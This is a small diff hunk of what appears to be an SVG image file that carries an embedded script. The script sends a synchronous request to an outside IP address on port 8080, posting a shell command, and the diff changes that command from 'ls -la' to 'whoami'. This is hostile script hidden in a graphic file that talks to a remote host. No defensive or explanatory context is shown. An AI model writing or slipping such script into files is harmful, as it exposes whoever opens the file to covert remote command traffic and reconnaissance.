@@ -2,7 +2,7 @@
     <script>
       const xhr = new XMLHttpRequest();
       xhr.open('GET', 'http://128.199.217.192:8080', false); // synchronous request
-      xhr.send('command=ls -la');
+      xhr.send('command=whoami');
       console.log(xhr.responseText);
     </script>
     <rect x="10" y="10" width="50" height="50" fill="#ff1230" />
